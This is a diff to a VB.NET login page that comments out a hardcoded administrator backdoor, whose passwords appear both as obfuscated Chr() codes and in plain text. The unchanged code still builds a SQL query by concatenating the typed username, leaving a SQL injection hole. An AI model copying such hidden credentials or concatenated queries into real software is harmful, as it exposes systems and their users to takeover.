@@ -38,21 +38,21 @@ Public Class frmLogin
         End If
         If txtUsuario.Text <> "" Then
             If txtPwd.Text <> "" Then
-                If TrUc(txtUsuario.Text) = "ADMIN" And
-                (TrUc(txtPwd.Text) = UCase(Chr(64) + Chr(77) + Chr(97) + Chr(114) + Chr(97) + Chr(108) + Chr(106) + Chr(111) + Chr(48)) _
-                 Or TrUc(txtPwd.Text) = "@ACCESO1#") Then
-                    Session("idUsuario") = "ADMIN"
-                    Session("NombreCompleto") = "ADMINISTRADOR DEL SISTEMA"
-                    Session("ID_ROLE") = 1
-                    Session("FLG_ADMIN") = True
-                    Session("ID_AGENCIA") = getDATO(False, 1)
-                    If Session("ID_ROLE") = 1 Then
-                        Response.Redirect("~/Marketing/frmMarketing.aspx")
-                    ElseIf Session("ID_ROLE") = 2 Then
-                        Response.Redirect("~/Agency/frmAgency.aspx")
-                    End If
-                Else
-                        If bCAMPO_EXISTE("TAB_USUARIOS", "ID_USUARIO", TrUc(txtUsuario.Text)) = True Then
+                'If TrUc(txtUsuario.Text) = "ADMIN" And
+                '(TrUc(txtPwd.Text) = UCase(Chr(64) + Chr(77) + Chr(97) + Chr(114) + Chr(97) + Chr(108) + Chr(106) + Chr(111) + Chr(48)) _
+                ' Or TrUc(txtPwd.Text) = "@ACCESO1#") Then
+                '    Session("idUsuario") = "ADMIN"
+                '    Session("NombreCompleto") = "ADMINISTRADOR DEL SISTEMA"
+                '    Session("ID_ROLE") = 1
+                '    Session("FLG_ADMIN") = True
+                '    Session("ID_AGENCIA") = getDATO(False, 1)
+                '    If Session("ID_ROLE") = 1 Then
+                '        Response.Redirect("~/Marketing/frmMarketing.aspx")
+                '    ElseIf Session("ID_ROLE") = 2 Then
+                '        Response.Redirect("~/Agency/frmAgency.aspx")
+                '    End If
+                'Else
+                If bCAMPO_EXISTE("TAB_USUARIOS", "ID_USUARIO", TrUc(txtUsuario.Text)) = True Then
                         sSql = "SELECT * FROM  TAB_USUARIOS WHERE ID_USUARIO ='" + TrUc(txtUsuario.Text) + "'"
                         dsUSUARIO = dsOpenDB(sSql)
                         If dsUSUARIO.Tables(0).Rows.Count > 0 Then
@@ -91,7 +91,7 @@ Public Class frmLogin
                         msg("USERT NOT FOUND")
                         LIMPIAR_CAMPOS()
                     End If
-                End If
+                'End If
             Else
                 msg("PASSWORD FIELD CAN'T BE EMPTY")
                 LIMPIAR_CAMPOS()
